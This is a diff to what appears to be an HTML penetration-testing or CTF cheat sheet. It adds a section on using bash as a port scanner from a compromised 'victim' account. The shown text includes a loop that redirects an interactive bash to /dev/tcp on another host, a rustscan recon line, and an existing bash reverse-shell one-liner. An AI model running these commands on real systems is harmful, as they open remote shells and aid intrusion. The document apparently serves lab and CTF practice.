@@ -30,6 +30,18 @@ and your IP changes just before the game starts, and no script have the correct 
 
 <b>In this example 10.10.10.10 is the old-ip and 20.20.20.20 is the new-ip.</b>
 
+<h2>Use your bash as a portscanner</h2>
+
+<b>(Use bash to portscan new host thats only accesible from victim machine, with no other portscanner in reach.)</b>
+
+<b>Open ports gives you back a "Done"</b>
+
+<b>Closed ports give you back a "Connection refused"</b>
+
+<b>hacked-account@victim~: <code>for i in 79 80 81; do echo $i & bash -i >& /dev/tcp/10.10.20.30/$i 0>&1;done</code>
+
+<br><br>
+
 <h2>RECON</h2> 
 
 <b>pform@attacker~: </b><code>rustscan -A 10.10.10.10</code>
@@ -182,7 +194,7 @@ Pentestmonkey <li>http://pentestmonkey.net/</li>
 
 <h2>Bash</h2>
 
-Use this if you have direct access to commands like whoami.
+Use this if you have direct access to console commands like whoami.
 
 <code>/bin/bash -i >& /dev/tcp/10.10.10.10/5555</code>
 
